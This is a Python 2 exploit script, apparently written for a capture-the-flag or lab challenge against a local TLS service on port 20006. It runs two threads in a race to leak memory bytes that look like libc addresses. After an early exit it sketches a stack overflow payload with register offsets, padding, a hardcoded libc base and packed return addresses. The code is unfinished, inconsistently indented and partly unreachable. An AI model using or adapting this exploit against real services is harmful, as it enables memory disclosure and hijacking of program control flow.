#!/usr/bin/python
import socket
import struct
import ssl
import time
import telnetlib
import threading
v = ('127.0.0.1', 20006)


# connection 
def connect(v):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(v)
	s = ssl.wrap_socket(s)
	s.recv(1024)
	return s


# MainEngine For Updating Data Regularly
class MainEngine(threading.Thread):
	def __init__(self, v):
		threading.Thread.__init__(self)
		self.s = connect(v)
		self.runcycle = True

	def run(self):
		print "[*] Main Engine Started."
	        buf1 = "B"*25
        	buf2 = "A"*25
        	size = len(buf1)
        	key = "test"
		while self.runcycle:
		                self.s.send("s {} {}\n".format(key, size))
                		self.s.send("{}\n".format(buf1))
		self.s.send('exit\n')
		self.s.close()	
		print "[*] Main Engine Close."
		return

# Back Engine For Reading Data Regularly
class BackEngine(threading.Thread):
	def __init__(self, v, engine):
		threading.Thread.__init__(self)
		self.engine = engine
		self.v = connect(v)
		
	def run(self):
		print "[*] Back Engine Start"
		while True:
			self.v.send('g test\n')
                	chk = self.v.recv(1024)                	
                	if chk:
                        	if ('\xb6' in chk) or ('\xb7' in chk) or ('\xb8' in chk) or ('\xb9' in chk):
                                	print [chk]
					self.engine.runcycle = False
					self.v.close()
					print "[*] Back Engine Close"
					return
		return


def main():
	v = ('127.0.0.1', 20006)
	thread = MainEngine(v)
	thread1 = BackEngine(v, thread)
	thread.start()
	thread1.start()
	print '[+] Waiting For Response.'
	thread1.join()
	print '[-] Extracting Data From Response.'
	return


main()
exit(0)


# Payload
# EIP = 60
# EDI = 52
# ESI = 48
# EBP = 56
# EBX  = 44


payload = 'A'*44  # Paddings
payload += 'BBBB' # EBX
payload += 'CCCC' # ESI
payload += 'DDDD' # EDI
payload += 'EEEE' # EBP
payload += 'FFFF' # EIP


# Got Control Over 
# EAX = EAX - 
# EDX = 64 Offset 
# ESI = 64 Offset
#  mov    eax,DWORD PTR [esi+0x55c]

addr = 0xb74bf000 # libc base address
addr += 0x10 # why 0x10 ? hmm, little brute force  testing
bof = payload
bof += struct.pack('I', addr + 12) # Just Paddings
bof += struct.pack('I', addr + 8) 
bof += struct.pack('I', addr + 4) 
bof = 'A'*64+ struct.pack('I', 0xb73e619c)

